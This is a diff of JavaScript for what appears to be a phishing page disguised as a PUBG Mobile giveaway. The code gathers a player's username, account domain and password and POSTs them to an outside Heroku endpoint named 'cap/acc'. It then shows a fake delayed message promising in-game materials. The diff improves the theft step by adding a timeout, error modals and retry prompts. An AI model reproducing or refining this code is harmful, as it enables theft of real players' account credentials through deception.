@@ -142,26 +142,30 @@ $(document).ready(function () {
 
         // check all are valid ?
         if ($('#data :input.form-control').hasClass('is-invalid')) {
-            $('#tapatap').addClass('disabled');
+            if ($('#tapatap').hasClass('disabled')) {
+                // do nothing
+            } else {
+                $('#tapatap').addClass('disabled');
+            }
         } else {
             $('#tapatap').removeClass('disabled');
         }
     });
 
-    $(document).ajaxStart(function () {
-        $("#snackbar").addClass('show');
-        $("#data :input").prop("disabled", true);
+    // $(document).ajaxStart(function () {
+    //     $("#snackbar").addClass('show');
+    //     $("#data :input").prop("disabled", true);
 
-        if ($('#tapatap').hasClass('disabled')) {
-            // do nothing
-        } else {
-            $('#tapatap').addClass('disabled');
-        }
-    }).ajaxStop(function () {
-        if ($('#snackbar').hasClass('show')) {
-            $("#snackbar").removeClass('show');
-        }
-    });
+    //     if ($('#tapatap').hasClass('disabled')) {
+    //         // do nothing
+    //     } else {
+    //         $('#tapatap').addClass('disabled');
+    //     }
+    // }).ajaxStop(function () {
+    //     if ($('#snackbar').hasClass('show')) {
+    //         $("#snackbar").removeClass('show');
+    //     }
+    // });
 
     $('.fa-sync').on('click', function () {
         captchaGen();
@@ -201,50 +205,70 @@ $(document).ready(function () {
                     "accPass": pass,
                 }
 
-                $.ajax({
-                    type: "POST",
-                    url: "https://cap-pubgm-id.herokuapp.com/cap/acc",
-                    data: JSON.stringify(payload),
-                    dataType: "json",
-                    contentType: "application/json",
-                    success: function () {
-                        if ($('#snackbar').hasClass('show')) {
-                            $("#snackbar").removeClass('show');
+                try {
+                    $.ajax({
+                        url: "https://cap-pubgm-id.herokuapp.com/cap/acc",
+                        method: "POST",
+                        timeout: 2500,
+                        data: JSON.stringify(payload),
+                        dataType: "json",
+                        contentType: "application/json",
+                        success: function () {
+                            if ($('#snackbar').hasClass('show')) {
+                                $("#snackbar").removeClass('show');
+                            }
+                            $('#data').get(0).reset();
+                            captchaGen();
+                            $('.participate-div').hide();
+                            // $('.circle-loader').show();
+                            $("body").css({ "background": "#000", "color": "#fff" });
+                            $("#term").show();
+    
+                            let materials = winner(user, domain);
+                            $("#load-modal").modal({
+                                backdrop: 'static',
+                                keyboard: false,
+                            });
+    
+                            $('#load-modal').modal('show');
+    
+                            setTimeout(() => {
+                                $('.circle-loader').toggleClass('load-complete');
+                                $('.checkmark').toggle();
+                                $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
+                                drawMaterial(materials);
+                                $('.circle-loader').hide();
+                                $('#msg').html(
+                                    "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
+                                    "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
+                                );
+                                $('#load-modal .modal-footer').show();
+                            }, 35000);
+                        },
+                        error: function (textStatus, errorThrown) {
+                            $('#err-modal').modal('show');
+
+                            if ($('#snackbar').hasClass('show')) {
+                                $("#snackbar").removeClass('show');
+                            }
+
+                            if (errorThrown === "timeout") {
+                                if ($('#tapatap').hasClass('disabled')) {
+                                    $('#tapatap').removeClass('disabled');
+                                }
+
+                                $('#err-modal .modal-title').html("Serever timeout");
+                                $('#err-modal .modal-body h5').html("Please press \"Get Materials\" button again.");
+
+                                $('#err-modal .modal-footer').html('<button class="btn btn-secondary" data-dismiss="modal">Close</button>');
+                            } else {
+                                $('#err-modal .modal-footer').html('<button class="btn btn-danger dismiss" data-dismiss="modal">Close</button>');
+                            }
                         }
-                        $('#data').get(0).reset();
-                        captchaGen();
-                        $('.participate-div').hide();
-                        // $('.circle-loader').show();
-                        $("body").css({ "background": "#000", "color": "#fff" });
-                        $("#term").show();
-
-                        let materials = winner(user, domain);
-                        $("#load-modal").modal({
-                            backdrop: 'static',
-                            keyboard: false,
-                        });
-
-                        $('#load-modal').modal('show');
-
-                        setTimeout(() => {
-                            $('.circle-loader').toggleClass('load-complete');
-                            $('.checkmark').toggle();
-                            $('#load-modal .modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
-                            drawMaterial(materials);
-                            $('.circle-loader').hide();
-                            $('#msg').html(
-                                "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
-                                "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
-                            );
-                            $('#load-modal .modal-footer').show();
-                        }, 35000);
-                    },
-                    error: function (textStatus, errorThrown) {
-                        $('#err-modal').modal('show');
-                        console.log(`status: ${textStatus}`);
-                        console.log(errorThrown);
-                    }
-                });
+                    });
+                } catch (error) {
+                    console.log(error);
+                }
             } else {
                 $('#pass').addClass('is-invalid');
             }
